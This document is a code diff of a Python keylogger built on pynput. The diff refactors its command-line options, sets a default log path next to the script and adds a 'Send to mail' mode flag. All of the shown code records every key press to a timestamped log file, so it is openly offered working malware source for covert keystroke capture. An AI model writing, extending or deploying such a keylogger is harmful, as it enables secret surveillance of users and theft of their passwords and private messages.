@@ -1,40 +1,54 @@
-import logging,os,argparse,sys
+import logging, os, argparse, sys, threading
 
 from pynput.keyboard import Key, Listener
 
-def GetSlash () :
-	if (sys.platform[0] == "w") :
-		return chr(92) #backslash if windows
-	else :
-		return chr(47) #slash if unix
+mode = 0
+path = os.path.join(os.path.abspath(os.path.dirname(sys.argv[0])),"log.txt")
+#path = "/Users/machina/Desktop/log.txt"
+log_type = 1
 
-def GetArgs () :
+def _GetArgs () :
+	global mode, path, log_type
+
 	parser = argparse.ArgumentParser(description="Cross platform keylogger powered by pynput")
 
-	parser.add_argument("-p", "--file_path", type=str, default=os.getcwd(), help="Path for log file [default = current user]")
-	parser.add_argument("-n", "--file_name", type=str, default="log", help="Name of the log file [default = log]")
-	parser.add_argument("-d", "--log_date", type=int, default=1, help="Log date and time [default = 1]")
+	help = {
+		mode : "Mode (0 : Log to text 1 : Send to mail)[default = {}]".format(mode) ,
+		path : "Path for log file [default = {}]".format(path) ,
+		log_type : "Log date and time [default = {}]".format(log_type)
+	}
 
-	return parser.parse_args()
+	parser.add_argument("-x", "--mode", type=int, default=mode, help=help[mode])
+	parser.add_argument("-p", "--path", type=str, default=path ,help=help[path])
+	parser.add_argument("-d", "--log_type", type=int, default=log_type, help=help[log_type])
+
+	args = parser.parse_args()
+
+	mode = args.mode
+	path = args.path
+	log_type = args.log_type
 
 def main () :
-	args = GetArgs()
-	sl = GetSlash()
 
-	log_dir = args.file_path + sl + args.file_name + ".txt"
+	def on_press (key) :
+		logging.info(str(key))
 
-	if (args.log_date == 1) :
+
+	if (log_type == 1) :
 		log_format = "%(asctime)s: %(message)s"
 	else :
 		log_format = ""
 	
-	logging.basicConfig(filename =log_dir, level=logging.DEBUG, format=log_format)
+	logging.basicConfig(filename =path, level=logging.DEBUG, format=log_format)
 
 	with Listener(on_press=on_press) as listener:
 		listener.join()
 
-def on_press(key):
-	logging.info(str(key))
+
+
+
 
 if __name__ == "__main__":
+	_GetArgs()
+	print(path)
 	main()
